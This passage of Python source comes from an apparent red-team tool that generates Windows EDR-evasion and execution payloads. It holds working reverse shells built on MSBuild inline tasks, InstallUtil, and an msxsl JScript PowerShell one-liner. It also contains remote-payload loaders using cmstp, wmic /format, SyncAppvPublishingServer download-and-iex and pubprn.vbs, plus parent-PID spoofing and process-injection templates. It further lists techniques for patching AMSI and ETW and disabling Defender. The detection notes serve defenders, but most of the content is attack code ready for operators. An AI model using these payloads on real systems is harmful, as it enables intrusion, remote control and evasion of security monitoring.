            "Memory entropy spikes during process sleep windows (EDR memory scanner)",
        ],
    )


# ── Process tradecraft ───────────────────────────────────────────────────────

def _ppid_spoof(payload: str, obfuscate: bool) -> EvasionResult:
    """
    Spoof the parent PID of a child process so it appears to be spawned by
    explorer.exe (or any selected target) instead of powershell.exe. Defeats
    parent-child process detection rules.
    """
    code = (
        "Add-Type -TypeDefinition @'\n"
        "using System;\n"
        "using System.Runtime.InteropServices;\n"
        "using System.Diagnostics;\n"
        "public static class PPID {\n"
        "    [StructLayout(LayoutKind.Sequential)] public struct STARTUPINFOEX {\n"
        "        public STARTUPINFO StartupInfo; public IntPtr lpAttributeList;\n"
        "    }\n"
        "    [StructLayout(LayoutKind.Sequential)] public struct STARTUPINFO {\n"
        "        public uint cb; public IntPtr lpReserved, lpDesktop, lpTitle;\n"
        "        public uint dwX, dwY, dwXSize, dwYSize, dwXCountChars, dwYCountChars, dwFillAttribute, dwFlags;\n"
        "        public ushort wShowWindow, cbReserved2; public IntPtr lpReserved2, hStdInput, hStdOutput, hStdError;\n"
        "    }\n"
        "    [StructLayout(LayoutKind.Sequential)] public struct PROCESS_INFORMATION {\n"
        "        public IntPtr hProcess, hThread; public uint dwProcessId, dwThreadId;\n"
        "    }\n"
        "    [DllImport(\"kernel32\", SetLastError=true)] public static extern bool CreateProcess(\n"
        "        string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes,\n"
        "        IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags,\n"
        "        IntPtr lpEnvironment, string lpCurrentDirectory,\n"
        "        ref STARTUPINFOEX lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);\n"
        "    [DllImport(\"kernel32\")] public static extern bool InitializeProcThreadAttributeList(\n"
        "        IntPtr lpAttributeList, int dwAttributeCount, int dwFlags, ref IntPtr lpSize);\n"
        "    [DllImport(\"kernel32\")] public static extern bool UpdateProcThreadAttribute(\n"
        "        IntPtr lpAttributeList, uint dwFlags, IntPtr Attribute, IntPtr lpValue,\n"
        "        IntPtr cbSize, IntPtr lpPreviousValue, IntPtr lpReturnSize);\n"
        "    [DllImport(\"kernel32\")] public static extern IntPtr OpenProcess(uint a, bool i, uint pid);\n"
        "}\n"
        "'@;\n"
        "$expPid=(Get-Process -Name explorer | Select-Object -First 1).Id;\n"
        "$pHandle=[PPID]::OpenProcess(0x000F0000, $false, $expPid);  # PROCESS_CREATE_PROCESS\n"
        "# operator: complete CreateProcess flow with EXTENDED_STARTUPINFO_PRESENT (0x00080000)\n"
        "# and PROC_THREAD_ATTRIBUTE_PARENT_PROCESS (0x00020000) populated with $pHandle.\n"
        "Write-Output ('parent handle: ' + $pHandle.ToString('X'))"
    )
    if obfuscate:
        code = ps_tick_marks(code)
    return EvasionResult(
        command=f"powershell -NoP -NonI -W Hidden -Exec Bypass -C \"{code}\"",
        technique="ppid_spoof",
        notes=(
            "Parent PID spoofing — child appears spawned by explorer.exe. Defeats "
            "parent-child rules like 'winword.exe spawning powershell.exe'. EDRs "
            "that record token impersonation (Defender for Endpoint) may still "
            "flag because the access token comes from the calling process, not "
            "the spoofed parent."
        ),
        techniques=["T1134.004"],
        risk="HIGH",
        detections=[
            "Sysmon Event 1 — process parent PID mismatch with creator PID",
            "Microsoft-Windows-Kernel-Process/Analytic logs (when enabled)",
            "EDR rules on PROC_THREAD_ATTRIBUTE_PARENT_PROCESS usage",
        ],
    )


def _process_hollowing(payload: str, obfuscate: bool, lhost: str, lport: int) -> EvasionResult:
    source = f"""// Process hollowing template — C# stub. Operator compiles to .exe and runs.
// 1. CreateProcess(target.exe, CREATE_SUSPENDED) — typically notepad.exe / svchost.exe.
// 2. NtUnmapViewOfSection on the suspended process image base.
// 3. VirtualAllocEx(target, base, size, RW) and WriteProcessMemory(target, base, shellcode).
// 4. SetThreadContext to point RIP at AddressOfEntryPoint.
// 5. ResumeThread.
// Final process tree shows notepad.exe (the legit hollowed target).
//
// References: github.com/m0n0ph1/Process-Hollowing
// Production beacons embed this in their stager — supply shellcode generated
// from /generate?language=csharp&lhost={lhost}&lport={lport}.
//
// detections:
//   - SetThreadContext on remote thread to non-image RWX region
//   - Image base mismatch between process and its loaded module
//   - Sysmon Event 8 (CreateRemoteThread) — rare in normal usage
"""
    return EvasionResult(
        command=source,
        technique="process_hollowing",
        notes=(
            "Process hollowing template. Replace shellcode placeholder with bytes "
            f"from /generate?language=csharp&lhost={lhost}&lport={lport}. Modern "
            "EDRs (CrowdStrike, Defender for Endpoint) catch the classic 5-step "
            "flow — chain with ntdll_unhook + ppid_spoof for higher success."
        ),
        techniques=["T1055.012"],
        risk="CRITICAL",
        detections=[
            "Sysmon Event 8 (CreateRemoteThread) on freshly spawned target",
            "Memory scanner: image base region not backed by file mapping",
            "EDR rule on NtUnmapViewOfSection + WriteProcessMemory sequence",
        ],
    )


def _module_stomping(payload: str, obfuscate: bool, lhost: str, lport: int) -> EvasionResult:
    source = f"""// Module stomping template — C# stub.
// 1. LoadLibraryEx a benign signed DLL (e.g. amsi.dll or version.dll).
// 2. VirtualProtect its .text section to PAGE_EXECUTE_READWRITE.
// 3. Memcpy shellcode into the .text region.
// 4. VirtualProtect back to PAGE_EXECUTE_READ.
// 5. CreateThread with start address inside the stomped region.
// The process now has a thread executing from a legitimate signed image —
// EDR module-integrity scanners see a clean file hash but the loaded bytes differ.
//
// Operator pairs this with shellcode from /generate?language=csharp&lhost={lhost}&lport={lport}.
//
// detections:
//   - Image .text region content drift vs file hash (memory integrity scan)
//   - Thread start address inside loaded module but at unusual offset
//   - Sysmon Event 7 followed by unusual VirtualProtect to RWX
"""
    return EvasionResult(
        command=source,
        technique="module_stomping",
        notes=(
            f"Module stomping — overwrites .text of a benign signed DLL with "
            f"shellcode. Pair with shellcode from /generate?language=csharp&lhost={lhost}&lport={lport}. "
            "Strong against image-name-allowlist EDRs; weak against memory "
            "integrity scanners that compare in-memory .text against disk hash."
        ),
        techniques=["T1055.001"],
        risk="CRITICAL",
        detections=[
            "Memory integrity scan: .text content drift from on-disk hash",
            "Thread start address inside loaded module at non-export offset",
            "EDR ASR rule 'Block executable content from email/web' once decoded",
        ],
    )


def _thread_hijack(payload: str, obfuscate: bool, lhost: str, lport: int) -> EvasionResult:
    source = f"""// Suspended thread hijack template — classic Cobalt Strike technique.
// 1. CreateRemoteThread is loud — instead, SuspendThread on an existing thread.
// 2. GetThreadContext to capture RIP, RSP.
// 3. WriteProcessMemory shellcode to a VirtualAllocEx RX region.
// 4. SetThreadContext with RIP pointing at the shellcode.
// 5. ResumeThread.
// The hijacked thread inherits the parent process's identity/token.
//
// Target threads of choice: services.exe worker threads (long-lived), or any
// process thread we already have a handle to (no OpenThread needed).
//
// Combine with shellcode from /generate?language=csharp&lhost={lhost}&lport={lport}.
//
// detections:
//   - Sysmon Event 8 with start address in a non-image VirtualAlloc region
//   - SetThreadContext on remote thread (rare outside debuggers)
//   - CrowdStrike 'queue-user-apc to remote-thread' detection
"""
    return EvasionResult(
        command=source,
        technique="thread_hijack",
        notes=(
            f"Thread hijack template. Stealthier than CreateRemoteThread for "
            "in-process injection. Pair with shellcode from "
            f"/generate?language=csharp&lhost={lhost}&lport={lport}. EDRs that "
            "monitor SetThreadContext on cross-process threads will flag it."
        ),
        techniques=["T1055.003"],
        risk="CRITICAL",
        detections=[
            "Sysmon Event 8 with non-image start address",
            "SetThreadContext on remote process thread",
            "Suspended thread with RIP modified outside its image bounds",
        ],
    )


# ── More LOLBAS ───────────────────────────────────────────────────────────────

def _lolbas_msbuild(payload: str, obfuscate: bool, lhost: str, lport: int) -> EvasionResult:
    xml = f"""<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="Run">
    <ClassExample />
  </Target>
  <UsingTask TaskName="ClassExample" TaskFactory="CodeTaskFactory"
             AssemblyFile="C:\\Windows\\Microsoft.Net\\Framework64\\v4.0.30319\\Microsoft.Build.Tasks.v4.0.dll">
    <Task>
      <Code Type="Class" Language="cs">
<![CDATA[
using System;
using System.Net.Sockets;
using System.IO;
using System.Diagnostics;
using Microsoft.Build.Framework;
using Microsoft.Build.Utilities;
public class ClassExample : Task {{
  public override bool Execute() {{
    var c = new TcpClient("{lhost}", {lport});
    var s = c.GetStream();
    var p = new Process();
    p.StartInfo.FileName = "cmd.exe";
    p.StartInfo.RedirectStandardInput = true;
    p.StartInfo.RedirectStandardOutput = true;
    p.StartInfo.UseShellExecute = false;
    p.Start();
    byte[] buf = new byte[1024]; int n;
    while ((n = s.Read(buf, 0, buf.Length)) > 0) {{
      string cmd = System.Text.Encoding.ASCII.GetString(buf, 0, n);
      p.StandardInput.WriteLine(cmd);
    }}
    return true;
  }}
}}
]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
"""
    return EvasionResult(
        command=(
            f"# Save the XML below as %TEMP%\\payload.xml then run:\n"
            f"# C:\\Windows\\Microsoft.Net\\Framework64\\v4.0.30319\\MSBuild.exe %TEMP%\\payload.xml\n"
            f"\n{xml}"
        ),
        technique="lolbas_msbuild",
        notes=(
            f"MSBuild inline-task — runs arbitrary C# code as msbuild.exe. "
            f"No PowerShell, no compiled .exe, no AMSI. Reverse shell to {lhost}:{lport}. "
            "Defender blocks via ASR 'Block process creations originating from PSExec/WMI'."
        ),
        techniques=["T1127.001"],
        risk="CRITICAL",
        detections=[
            "msbuild.exe spawning cmd.exe/powershell.exe (Sysmon Event 1)",
            "Defender ASR rule 'Block executable files from running unless they meet a prevalence, age, or trusted list criterion'",
            "MSBuild compiling C# task at runtime — Microsoft-Windows-DotNETRuntime ETW",
        ],
    )


def _lolbas_installutil(payload: str, obfuscate: bool, lhost: str, lport: int) -> EvasionResult:
    # The C# source uses InstallUtil's /U (uninstall) flag which invokes the
    # Uninstall override before any signing/auth check. The text is built as a
    # plain string (no f-string) to avoid PEP-498 brace-escaping noise on the
    # generic types used by .NET's Process API.
    src = (
        "// uninstaller.cs — operator compiles then triggers via:\n"
        "// csc.exe /platform:x64 /target:library /out:%TEMP%\\u.dll uninstaller.cs\n"
        "// C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U %TEMP%\\u.dll\n"
        "using System;\n"
        "using System.ComponentModel;\n"
        "using System.Configuration.Install;\n"
        "using System.Net.Sockets;\n"
        "using System.Diagnostics;\n"
        "\n"
        "[RunInstaller(true)]\n"
        "public class Sample : Installer {\n"
        "    public override void Uninstall(System.Collections.IDictionary s) {\n"
        f"        var c = new TcpClient(\"{lhost}\", {lport});\n"
        "        var st = c.GetStream();\n"
        "        var p = new Process();\n"
        "        p.StartInfo.FileName = \"cmd.exe\";\n"
        "        p.StartInfo.RedirectStandardInput = true;\n"
        "        p.StartInfo.RedirectStandardOutput = true;\n"
        "        p.StartInfo.UseShellExecute = false;\n"
        "        p.Start();\n"
        "        byte[] buf = new byte[1024]; int n;\n"
        "        while ((n = st.Read(buf, 0, buf.Length)) > 0) {\n"
        "            string cmd = System.Text.Encoding.ASCII.GetString(buf, 0, n);\n"
        "            p.StandardInput.WriteLine(cmd);\n"
        "        }\n"
        "    }\n"
        "}\n"
    )
    return EvasionResult(
        command=src,
        technique="lolbas_installutil",
        notes=(
            f"InstallUtil.exe /U triggers the Uninstall override of a signed "
            f"installer DLL — runs C# under installutil.exe (.NET trusted). "
            f"Reverse shell to {lhost}:{lport}. Detection: installutil.exe spawning cmd.exe."
        ),
        techniques=["T1218.004"],
        risk="HIGH",
        detections=[
            "installutil.exe spawning cmd.exe / cmd /c (Sysmon Event 1)",
            "Sysmon Event 7: installutil.exe loading non-Microsoft DLL",
            "Microsoft-Windows-DotNETRuntime ETW: assembly load from %TEMP%",
        ],
    )


def _lolbas_cmstp(payload: str, obfuscate: bool, lhost: str, lport: int) -> EvasionResult:
    inf = (
        "[version]\n"
        "Signature=$chicago$\n"
        "AdvancedINF=2.5\n"
        "\n"
        "[DefaultInstall_SingleUser]\n"
        "UnRegisterOCXs=UnRegisterOCXSection\n"
        "\n"
        "[UnRegisterOCXSection]\n"
        f"%11%\\scrobj.dll,NI,http://{lhost}:{lport}/payload.sct\n"
        "\n"
        "[Strings]\n"
        "AppAct = \"SOFTWARE\\Microsoft\\Connection Manager\"\n"
        "ServiceName=\"PayloadCM\"\n"
        "ShortSvcName=\"Payload\"\n"
    )
    return EvasionResult(
        command=(
            "# Save below as %TEMP%\\payload.inf then run:\n"
            "# cmstp.exe /au %TEMP%\\payload.inf\n\n" + inf
        ),
        technique="lolbas_cmstp",
        notes=(
            f"cmstp.exe + INF file triggers remote .sct scriptlet over HTTP. "
            f"Host the SCT at http://{lhost}:{lport}/payload.sct. Bypasses many "
            "default UAC settings (cmstp is auto-elevated for some INF profiles)."
        ),
        techniques=["T1218.003"],
        risk="HIGH",
        detections=[
            "cmstp.exe with INF path argument in command line (Sysmon Event 1)",
            "cmstp.exe initiating outbound HTTP to non-Microsoft host",
            "scrobj.dll loaded by cmstp.exe (Sysmon Event 7)",
        ],
    )


def _lolbas_msxsl(payload: str, obfuscate: bool, lhost: str, lport: int) -> EvasionResult:
    xsl = (
        '<?xml version="1.0"?>\n'
        '<stylesheet xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt" \n'
        '            xmlns:user="placeholder" version="1.0">\n'
        '  <output method="text"/>\n'
        '  <ms:script implements-prefix="user" language="JScript">\n'
        '    <![CDATA[\n'
        '    var r = new ActiveXObject("WScript.Shell").Run(\n'
        f'      "cmd /c powershell -NoP -W Hidden -Exec Bypass -c \\"$c=New-Object System.Net.Sockets.TCPClient(\'{lhost}\',{lport});'
        '$s=$c.GetStream();[byte[]]$b=0..65535|%{0};'
        'while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i);'
        '(iex $d 2>&1|Out-String)|%{[text.encoding]::ASCII.GetBytes($_)}|'
        '%{$s.Write($_,0,$_.Length);$s.Flush()}};$c.Close()\\"",\n'
        '      0, false);\n'
        '    ]]>\n'
        '  </ms:script>\n'
        '</stylesheet>\n'
    )
    return EvasionResult(
        command=(
            "# Save as payload.xsl, host alongside any XML file. Then on target:\n"
            "# msxsl.exe http://attacker/dummy.xml http://attacker/payload.xsl\n"
            "# (Requires msxsl.exe — operator must drop the binary first; not on Win10+ by default.)\n\n"
            + xsl
        ),
        technique="lolbas_msxsl",
        notes=(
            f"msxsl.exe executes embedded JScript via XSL transform. "
            f"Hosts JScript that spawns a PS reverse shell to {lhost}:{lport}. "
            "msxsl.exe is Microsoft-signed but not present by default — operator "
            "stages it via certutil first."
        ),
        techniques=["T1220"],
        risk="HIGH",
        detections=[
            "msxsl.exe execution — uncommon on default Windows 10+ installs",
            "msxsl.exe spawning powershell.exe / cmd.exe (high-fidelity)",
            "JScript execution via XSL ms:script (Microsoft-Windows-XPS-Spooler / IE log)",
        ],
    )


def _lolbas_wmic_xsl(payload: str, obfuscate: bool, lhost: str, lport: int) -> EvasionResult:
    return EvasionResult(
        command=(
            f"# Host an XSL stylesheet at http://{lhost}:{lport}/payload.xsl that uses\n"
            f"# ms:script JScript to spawn cmd. Then on target:\n"
            f"wmic.exe os get /format:\"http://{lhost}:{lport}/payload.xsl\""
        ),
        technique="lolbas_wmic_xsl",
        notes=(
            f"wmic.exe /format: with a remote XSL URL loads and executes embedded "
            f"JScript. Reverse shell host: {lhost}:{lport}. Most EDRs flag this — "
            "wmic.exe outbound to non-corporate host is rare."
        ),
        techniques=["T1220", "T1047"],
        risk="HIGH",
        detections=[
            "wmic.exe with /format: pointing to HTTP URL (high-fidelity)",
            "wmic.exe spawning powershell.exe or cmd.exe (Sysmon Event 1)",
            "Outbound HTTP from wmic.exe (very unusual)",
        ],
    )


def _lolbas_syncappv(payload: str, obfuscate: bool, lhost: str, lport: int) -> EvasionResult:
    return EvasionResult(
        command=(
            f"powershell -NoP -NonI -W Hidden -Exec Bypass -C "
            f"\"$a='Sync'+'AppvPublishingServer';"
            f"&($a) 'n;(New-Object Net.WebClient).DownloadString(\\\"http://{lhost}:{lport}/payload.ps1\\\")|iex'\""
        ),
        technique="lolbas_syncappv",
        notes=(
            f"SyncAppvPublishingServer cmdlet executes argument injected via 'n;'. "
            f"Bypasses AppLocker / WDAC PowerShell signing for the injected payload. "
            f"Hosts payload at http://{lhost}:{lport}/payload.ps1."
        ),
        techniques=["T1218.013"],
        risk="HIGH",
        detections=[
            "SyncAppvPublishingServer.vbs / .exe usage outside App-V context",
            "PowerShell ScriptBlock log entry with SyncAppvPublishingServer string",
            "Outbound HTTP from PowerShell.exe to non-corporate host",
        ],
    )


def _lolbas_pubprn(payload: str, obfuscate: bool, lhost: str, lport: int) -> EvasionResult:
    return EvasionResult(
        command=(
            f"# Host a JScript scriptlet at http://{lhost}:{lport}/payload.sct that spawns the payload.\n"
            f"cscript.exe /b C:\\Windows\\System32\\Printing_Admin_Scripts\\en-US\\pubprn.vbs "
            f"localhost \"script:http://{lhost}:{lport}/payload.sct\""
        ),
        technique="lolbas_pubprn",
        notes=(
            f"pubprn.vbs accepts a 'script:' URL as the second argument and "
            f"instantiates the remote scriptlet. Effective against AppLocker "
            f"script policies that allow cscript.exe + signed Microsoft scripts. "
            f"Stage SCT at http://{lhost}:{lport}/payload.sct."
        ),
        techniques=["T1216", "T1218"],
        risk="HIGH",
        detections=[
            "cscript.exe / wscript.exe with pubprn.vbs argument (high-fidelity)",
            "scrobj.dll loaded by cscript.exe (Sysmon Event 7)",
            "Outbound HTTP for .sct file from cscript.exe",
        ],
    )


# ── Public API ─────────────────────────────────────────────────────────────────

# Techniques that take (payload, obfuscate, lhost, lport).
_NETWORK_TECHNIQUES = {
    "lolbas_regsvr32", "lolbas_certutil", "lolbas_msbuild", "lolbas_installutil",
    "lolbas_cmstp", "lolbas_msxsl", "lolbas_wmic_xsl", "lolbas_syncappv",
    "lolbas_pubprn", "direct_syscalls", "indirect_syscalls",
    "process_hollowing", "module_stomping", "thread_hijack",
}

_DISPATCH = {
    # AMSI / ETW
    "amsi_reflection": _amsi_reflection,
    "amsi_patch_clr": _amsi_patch_clr,
    "amsi_hwbp": _amsi_hwbp,
    "amsi_provider_unregister": _amsi_provider_unregister,
    "amsi_wldp_downgrade": _amsi_wldp_downgrade,
    "etw_patch": _etw_patch,
    "etw_hwbp": _etw_hwbp,
    # CLM
    "clm_bypass_runspace": _clm_bypass_runspace,
    # Logging
    "scriptblock_logging_disable": _scriptblock_logging_disable,
    # Defender
    "defender_add_exclusion": _defender_add_exclusion,
    "defender_disable": _defender_disable,
    # Obfuscation
    "obfuscate_base64": _obfuscate_base64,
    # LOLBAS
    "lolbas_mshta": _lolbas_mshta,
    "lolbas_regsvr32": _lolbas_regsvr32,
    "lolbas_certutil": _lolbas_certutil,
    "lolbas_msbuild": _lolbas_msbuild,
    "lolbas_installutil": _lolbas_installutil,
    "lolbas_cmstp": _lolbas_cmstp,
    "lolbas_msxsl": _lolbas_msxsl,
    "lolbas_wmic_xsl": _lolbas_wmic_xsl,
    "lolbas_syncappv": _lolbas_syncappv,
    "lolbas_pubprn": _lolbas_pubprn,
    # PS downgrade
    "powershell_downgrade": _powershell_downgrade,
    # Syscalls / unhook
    "direct_syscalls": _direct_syscalls,
    "indirect_syscalls": _indirect_syscalls,
    "ntdll_unhook": _ntdll_unhook,
    # Sleep
    "sleep_obfuscation_ekko": _sleep_obfuscation_ekko,
    # Process tradecraft
    "ppid_spoof": _ppid_spoof,
    "process_hollowing": _process_hollowing,
    "module_stomping": _module_stomping,
    "thread_hijack": _thread_hijack,
}


# Backfill MITRE metadata for the legacy evasion techniques that pre-date the
# uniform-metadata refactor. Newer techniques set their own values; values here
# only apply when the dispatched function returned an empty list.
_LEGACY_MITRE = {
    "amsi_patch_clr": ("T1562.001", "CRITICAL", [
        "amsi.dll .text section content drift from disk hash",
        "Add-Type compilation in a process with no benign use case",
        "VirtualProtect call sequence flipping amsi.dll to RWX",
    ]),
    "etw_patch": ("T1562.006", "HIGH", [
        "EtwEventWrite first byte modified to 0xC3 (memory scan)",
        "VirtualProtect on ntdll!EtwEventWrite",
        "Sudden ETW provider silence per-process",
    ]),
    "clm_bypass_runspace": ("T1059.001", "HIGH", [
        "Add-Type emitting C# that creates FullLanguage runspace",
        "PowerShell child runspace with non-default LanguageMode",
        "Sysmon Event 4104 with InitialSessionState.CreateDefault2",
    ]),
    "scriptblock_logging_disable": ("T1562.002", "HIGH", [
        "Event 4657 on ScriptBlockLogging / Transcription policy keys",
        "EnableScriptBlockLogging value set to 0",
    ]),
    "defender_add_exclusion": ("T1562.001", "HIGH", [
        "Add-MpPreference -ExclusionPath in ScriptBlock log",
        "Defender event 5007 (real-time config changed)",
        "Tamper Protection event log entries",
    ]),
    "defender_disable": ("T1562.001", "CRITICAL", [
        "Set-MpPreference -DisableRealtimeMonitoring \"true\" (high-fidelity)",
        "Defender event 5001 (real-time protection disabled)",
        "Microsoft-Windows-Windows Defender/Operational alert",
    ]),
    "obfuscate_base64": ("T1027", "MEDIUM", [
        "PowerShell -EncodedCommand argument in process command line",
        "Long base64 string in PS log (Event 4104)",
        "AMSI scanning the decoded inner command",
    ]),
    "lolbas_mshta": ("T1218.005", "HIGH", [
        "mshta.exe with javascript:/vbscript: URI (Sysmon Event 1)",
        "mshta.exe spawning powershell.exe / cmd.exe",
        "Defender ASR rule 'Block executable use of mshta'",
    ]),
}


def generate_evasion(
    technique: str,
    payload: str = "powershell.exe",
    obfuscate: bool = True,
    lhost: str = "192.168.1.100",
    lport: int = 8080,
) -> EvasionResult:
    if technique not in _DISPATCH:
        raise ValueError(f"Unknown technique '{technique}'. Supported: {', '.join(SUPPORTED_TECHNIQUES)}")
    fn = _DISPATCH[technique]
    if technique in _NETWORK_TECHNIQUES:
        result = fn(payload, obfuscate, lhost, lport)
    else:
        result = fn(payload, obfuscate)
    # Backfill MITRE if the function didn't set any (legacy techniques).
    if not result.techniques and technique in _LEGACY_MITRE:
        tid, risk, detections = _LEGACY_MITRE[technique]
        result.techniques = [tid]
        result.risk = risk
        result.detections = detections
    return result
